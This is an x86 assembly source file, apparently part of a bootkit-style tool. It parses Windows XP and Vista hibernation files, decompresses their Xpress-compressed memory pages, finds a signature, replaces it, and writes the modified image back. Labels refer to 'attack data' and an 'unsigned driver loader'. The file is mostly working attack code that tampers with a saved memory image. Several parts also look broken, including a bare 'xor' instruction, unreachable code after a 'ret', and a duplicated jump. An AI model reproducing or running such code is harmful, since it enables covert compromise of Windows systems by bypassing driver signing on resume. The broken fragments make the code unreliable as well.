%define Next_Memory_Map                         bp-4
%define Current_Memory_Map                      bp-8
%define Current_Xpress_Page                     bp-12
%define PagesToCheck                            bp-16
%define PagesToOperate                          bp-20
%define Current_Xpress_Image_File_Pointer       bp-24
%define Next_Xpress_Image_File_Pointer          bp-28
%define Found_Signature                         bp-29
%define Found_Address                           bp-33
%define LastFilePage                            bp-37
%define Current_Memory_Table_Entry              bp-41
%define Current_Physical_Base_Address           bp-45
%define Original_Xpress_Image_Size              bp-49
%define Debug_Variable2                         bp-53
%define Stack_Frame_Size                        45 +8


Hibernation_File_Callback:

enter Stack_Frame_Size, 0

mov edx,eax

mov eax,Debug_Message_Found_File
call API_Debug_Message

push dword 4096
push dword Extended_Buffer
push edx
call API_Read_File
jc Hibernation_File_Attack_Error_Handler

push ds
mov ax,Extended_Buffer / 16
mov ds,ax
mov eax,[0]
mov ebx,[80]
mov [Next_Memory_Map],ebx
mov ebx,[84]
mov [LastFilePage],ebx
pop ds

mov eax,Debug_Message_Hiberfil_inactive
call API_Debug_Message_Append


jmp Hibernation_File_Callback_Exit


Hibernation_File_XP_active:
push ds
mov ax,Extended_Buffer / 16
mov ds,ax
mov ebx,[80 + 8]
mov [Next_Memory_Map],ebx
mov ebx,[84 + 8]
mov [LastFilePage],ebx
pop ds

mov eax,Debug_Message_Hiberfil_XP_active
jmp Hibernation_File_Found_Valid

Hibernation_File_XP_inactive:
push ds
mov ax,Extended_Buffer / 16
mov ds,ax
mov ebx,[80 + 8]
mov [Next_Memory_Map],ebx
mov ebx,[84 + 8]
mov [LastFilePage],ebx
pop ds

mov eax,Debug_Message_Hiberfil_XP_inactive
jmp Hibernation_File_Found_Valid

Hibernation_File_Vista_active:
mov eax,Debug_Message_Hiberfil_Vista_active
jmp Hibernation_File_Found_Valid

Hibernation_File_Vista_inactive:
mov eax,Debug_Message_Hiberfil_Vista_inactive


Hibernation_File_Found_Valid:

sub [LastFilePage],dword 18

%ifdef _Debug

call API_Debug_Message_Append

%endif




Hibernation_File_Patch:
mov ebx,[Next_Memory_Map]
shl ebx,12
mov [Current_Memory_Map],ebx
or ebx,ebx
jz Hibernation_File_Callback_Exit

mov [Next_Xpress_Image_File_Pointer],ebx
add [Next_Xpress_Image_File_Pointer],dword 4096

push dword ebx
push dword 0
push edx
call API_Seek_File
jc Hibernation_File_Attack_Error_Handler

push dword 4096
push dword Extended_Buffer
push edx
call API_Read_File
jc Hibernation_File_Attack_Error_Handler


; loop all entries
push ds
mov ax,Extended_Buffer / 16
mov ds,ax

mov ebx,[4]
mov [Next_Memory_Map],ebx
mov ecx,[12]

mov [Current_Xpress_Page],dword 16
mov [Current_Memory_Table_Entry],dword 0


Hibernation_File_Memory_Map_Entry:

or ecx,ecx
jz Hibernation_File_Memory_Map_Next

mov ax,Extended_Buffer / 16
mov ds,ax

add [Current_Memory_Table_Entry],dword 16
mov esi,[Current_Memory_Table_Entry]

dec ecx
push ecx

mov eax,[si+8]
sub eax,[si+4]

mov [PagesToCheck],eax

push dword [si+4]
pop dword [Current_Physical_Base_Address]


Hibernation_File_Xpress_Image:

cmp [Current_Xpress_Page],dword 16
jne Xpress_Image_Read

push dword 32
push dword Extended_Buffer + 4096
push edx
xor ax,ax
mov ds,ax
call API_Read_File
jc Hibernation_File_Attack_Error_Handler

mov ax,Extended_Buffer / 16
mov ds,ax
mov eax,[4096 + 0]
cmp [4096 + 0],dword 70788181h
jne Hibernation_File_Error_XpressSignature
jne Hibernation_File_Error_XpressSignature

mov ecx,[4096 + 9]
mov [Debug_Variable2],ecx
shr ecx,2
inc ecx
add ecx,00000111b
and ecx,0FFFFFFFFh - 00000111b
mov [Original_Xpress_Image_Size],ecx

push dword [Next_Xpress_Image_File_Pointer]
pop dword [Current_Xpress_Image_File_Pointer]
add [Next_Xpress_Image_File_Pointer],ecx
add [Next_Xpress_Image_File_Pointer],dword 32

push dword ecx
push dword Xpress_Image_Buffer
push edx
xor ax,ax
mov ds,ax
call API_Read_File
jc Hibernation_File_Attack_Error_Handler

push dword 16*4096
push dword Hibernation_File_Attack_Data
push dword Xpress_Image_Buffer
call API_Xpress_Decompress

%ifdef COMPRESSANDDECOMPRESSTOTESTALGORITHM
push dword 16*4096
push dword Xpress_Image_Buffer
push dword Hibernation_File_Attack_Data
call API_Xpress_Compress

push dword 16*4096
push dword Hibernation_File_Attack_Data
push dword Xpress_Image_Buffer
call API_Xpress_Decompress
%endif

call OperateXpressImage

mov [Current_Xpress_Page],dword 0

Xpress_Image_Read:

mov eax,16
sub eax,[Current_Xpress_Page]
cmp [PagesToCheck],eax
jae PagesToOperate_Set
mov eax,[PagesToCheck]

PagesToOperate_Set:
mov [PagesToOperate],eax

call OperateMemoryRange

mov eax,[PagesToOperate]
add [Current_Xpress_Page],eax
sub [PagesToCheck],eax

add [Current_Physical_Base_Address],eax

cmp [PagesToCheck],dword 0
je Hibernation_File_Memory_Map_Entry_Next

jmp Hibernation_File_Xpress_Image


Hibernation_File_Memory_Map_Entry_Next:

pop ecx

jmp Hibernation_File_Memory_Map_Entry


Hibernation_File_Memory_Map_Next:

pop ds

jmp Hibernation_File_Patch


Hibernation_File_Error_XpressSignature:

xor ax,ax
mov ds,ax
mov es,ax

mov eax,Error_Message_Xpress_Signature
call API_Debug_Message

mov eax,[Original_Xpress_Image_Size]
mov edi,Error_Message_Xpress_Image_Size + 35
call HexToStr_dword
mov eax,[Debug_Variable2]
mov edi,Error_Message_Xpress_Image_Size + 45
call HexToStr_dword
mov eax,Error_Message_Xpress_Image_Size
call API_Debug_Message

mov eax,[Current_Xpress_Image_File_Pointer]
mov edi,Error_Message_Xpress_Image_Pointer + 36
call HexToStr_dword
mov eax,Error_Message_Xpress_Image_Pointer
call API_Debug_Message

mov eax,[PagesToCheck]
mov edi,Error_Message_Xpress_Image_Status + 10
call HexToStr_dword
mov eax,[PagesToOperate]
mov edi,Error_Message_Xpress_Image_Status + 23
call HexToStr_dword
mov eax,[Current_Xpress_Page]
mov edi,Error_Message_Xpress_Image_Status + 36
call HexToStr_dword
mov eax,Error_Message_Xpress_Image_Status
call API_Debug_Message


%ifdef _Debug

mov eax,Debug_Message_ErrorDumpFile
call API_Debug_Message

mov eax,4096 + 32
mov ebx,Extended_Buffer
mov ecx,File_Dump_File
call Dump_File

mov eax,Debug_Message_Successful
call API_Debug_Message_Append

%endif


jmp Hibernation_File_Attack_Error_Handler
jmp Hibernation_File_Callback_Exit



Hibernation_File_Callback_Exit:
leave

ret


HexToStr_dword:
xor edx,edx
mov ebx,010000000h
div ebx

xchg eax,edx
call Store_Number

xor edx,edx
mov ebx,01000000h
div ebx

xchg eax,edx
call Store_Number

xor edx,edx
mov ebx,0100000h
div ebx

xchg eax,edx
call Store_Number

xor edx,edx
mov ebx,010000h
div ebx

xchg eax,edx
call Store_Number

xor edx,edx
mov ebx,01000h
div ebx

xchg eax,edx
call Store_Number

xor edx,edx
mov ebx,0100h
div ebx

xchg eax,edx
call Store_Number

xor edx,edx
mov ebx,010h
div ebx

xchg eax,edx
call Store_Number

xchg eax,edx
call Store_Number

ret



Store_Number:
cmp dl,0Ah
jnc Store_Number_h

add dl,30h
mov [edi],dl
inc edi
ret

Store_Number_h:
add dl,(41h-10)
mov [edi],dl
inc edi
ret

OperateXpressImage:
mov edi,Hibernation_File_Attack_Data
mov ecx,16 * 4096 - 1
call CheckSignature

cmp [Found_Signature],byte 0
je OperateXpressImage_Exit

call ReplaceFoundSignature

xor ax,ax
mov ds,ax
mov eax,Debug_Message_Signature_Found
call API_Debug_Message

mov eax,ProbeString
call API_Debug_Message_Append

call Replace_Xpress_Image

jmp Hibernation_File_Callback_Exit

OperateXpressImage_Exit:

ret

OperateMemoryRange:

ret
mov edi,[Current_Xpress_Page]
shl edi,12
add edi,Hibernation_File_Attack_Data
mov ecx,[PagesToOperate]
shl ecx,12
call CheckSignature

cmp [Found_Signature],byte 0
je OperateMemoryRange_Exit

call ReplaceFoundSignature

xor ax,ax
mov ds,ax
mov eax,Debug_Message_Signature_Found
call API_Debug_Message

call Hook_Hibernation_File_Memory_Range

mov eax,Debug_Message_Replaced
call API_Debug_Message

jmp Hibernation_File_Callback_Exit

OperateMemoryRange_Exit:

ret

Hook_Hibernation_File_Memory_Range:

mov eax,Debug_Message_DumpFile
call API_Debug_Message

mov eax,[PagesToOperate]
shl eax,12
mov ebx,[Current_Xpress_Page]
shl ebx,12
add ebx,Hibernation_File_Attack_Data
mov ecx,File_Dump_File
call Dump_File

mov eax,[PagesToOperate]
shl eax,12
push eax
push dword Xpress_Image_Buffer
mov eax,[Current_Xpress_Page]
shl eax,12
add eax,Hibernation_File_Attack_Data
push eax
mov ecx,eax
add esp,3*4
mov ecx,[Original_Xpress_Image_Size]

mov ax,Extended_Buffer / 16
mov ds,ax
mov es,ax

xor esi,esi
mov edi,8192
movsd
movsd
xor eax,eax
stosd
mov eax,1
stosd

mov esi,[Current_Memory_Table_Entry]
movsd
mov eax,[Current_Physical_Base_Address]
stosd
add eax,[PagesToOperate]
stosd
xor eax,eax
stosd

mov eax,[LastFilePage]
mov [4],eax
mov [8],dword 0

mov edi,12288
mov [edi],dword 70788181h
mov [edi+8],byte 15
mov eax,ecx
dec eax
shl eax,2
mov [edi+9],eax
mov [edi+13],dword 0

xor bx,bx
mov ds,bx
mov es,bx

push dword [Current_Memory_Map]
push dword 0
push edx
call API_Seek_File
jc Hibernation_File_Attack_Error_Handler

push dword 4096
push dword Extended_Buffer
push edx
call API_Write_File
jc Hibernation_File_Attack_Error_Handler

push dword [LastFilePage]
shl dword [esp],12
push dword 0
push edx
call API_Seek_File
jc Hibernation_File_Attack_Error_Handler

push dword 4096
push dword Extended_Buffer + 8192
push edx
call API_Write_File
jc Hibernation_File_Attack_Error_Handler

push dword 32
push dword Extended_Buffer + 12288
push edx
call API_Write_File
jc Hibernation_File_Attack_Error_Handler

push dword ecx
push dword 50000h
push edx
call API_Write_File
xor
jc Hibernation_File_Attack_Error_Handler

push dword 0
push dword 0
push edx
call API_Seek_File
jc Hibernation_File_Attack_Error_Handler

push dword 4096
push dword Extended_Buffer + 12288
push edx
call API_Read_File
jc Hibernation_File_Attack_Error_Handler

add ecx,4096 - 1
and ecx,0FFFFF000h
add ecx,4096
shr ecx,12

mov ax,Extended_Buffer / 16
mov ds,ax
add [12288 + 84],ecx

mov [12288 + 64],dword 0

xor ax,ax
mov ds,ax

push dword 0
push dword 0
push edx
call API_Seek_File
jc Hibernation_File_Attack_Error_Handler

push dword 4096
push dword Extended_Buffer + 12288
push edx

ret

Replace_Xpress_Image:


mov eax,Debug_Message_DumpXpress
call API_Debug_Message

mov eax,[Original_Xpress_Image_Size]
mov ebx,Xpress_Image_Buffer
mov ecx,Dump_File_Xpress_Input
call Dump_File

mov eax,Debug_Message_DumpFile
call API_Debug_Message

mov eax,16 * 4096
mov ebx,Hibernation_File_Attack_Data
mov ecx,File_Dump_File
call Dump_File

%ifdef testHACK
push es
pushad
mov edi,Hibernation_File_Attack_Data
ror edi,4
mov es,di
shr edi,32-4
xor eax,eax
mov ecx,10000h-1
rep stosb
stosb
popad
pop es
%endif

push dword 16*4096
push dword Xpress_Image_Buffer
push dword Hibernation_File_Attack_Data
call API_Xpress_Compress
mov ecx,eax

push ecx
mov eax,ecx
mov ebx,Xpress_Image_Buffer
mov ecx,Dump_File_Xpress_Output
call Dump_File
pop ecx

cmp ecx,[Original_Xpress_Image_Size]
jbe Replace_Xpress_Image_Write

mov eax,ecx
mov edi,Debug_Message_ErrorAppend + 39
call HexToStr_dword
mov eax,[Original_Xpress_Image_Size]
mov edi,Debug_Message_ErrorAppend + 50
call HexToStr_dword

mov eax,Debug_Message_ErrorAppend
call API_Debug_Message

ret

Replace_Xpress_Image_Write:

push es
push ecx
mov ax,Xpress_Image_Buffer / 16
mov es,ax

mov edi,ecx
mov ecx,[Original_Xpress_Image_Size]
sub ecx,edi

xor ax,ax
rep stosb

pop ecx
pop es

push dword [Current_Xpress_Image_File_Pointer]
add [esp],dword 32
push dword 0
push edx
call API_Seek_File
jc Hibernation_File_Attack_Error_Handler

push dword [Original_Xpress_Image_Size]
push dword Xpress_Image_Buffer
push edx
call API_Write_File
jc Hibernation_File_Attack_Error_Handler

mov eax,[Current_Xpress_Image_File_Pointer]
mov edi,Error_Message_Xpress_Image_Pointer + 36
call HexToStr_dword
mov eax,Error_Message_Xpress_Image_Pointer
call API_Debug_Message

mov eax,ecx
mov edi,Debug_Message_SuccessfulReplaced + 25
call HexToStr_dword
mov eax,[Original_Xpress_Image_Size]
mov edi,Debug_Message_SuccessfulReplaced + 45
call HexToStr_dword

mov eax,Debug_Message_SuccessfulReplaced
call API_Debug_Message

ret






%ifdef _Debug

Dump_File:
mov [Write_Dump_File_Callback + 2],eax
mov [Write_Dump_File_Callback + 8],ebx

push dword Write_Dump_File_Callback
push dword ecx
call API_Open_File
jc Hibernation_File_Attack_Error_Handler
jmp Write_Dump_File_Callback_end

Write_Dump_File_Callback:

push dword 012345678h
push dword 012345678h
push eax
call API_Write_File
jc Write_Dump_File_Callback_return

mov eax,Debug_Message_Successful
call API_Debug_Message_Append

Write_Dump_File_Callback_return:

ret

Write_Dump_File_Callback_end:

ret

%endif

Append_Unsigned_Driver_Loader:

xor ebx,ebx
mov ds,bx
mov es,bx

xor eax,eax

jmp Hibernation_File_Callback_Exit

File_Dump_File                          db  "*:\dumpfile.ko", 0
Dump_File_Xpress_Input                  db  "*:\XpressImageInput.ko", 0
Dump_File_Xpress_Output                 db  "*:\XpressImageOutput.ko", 0
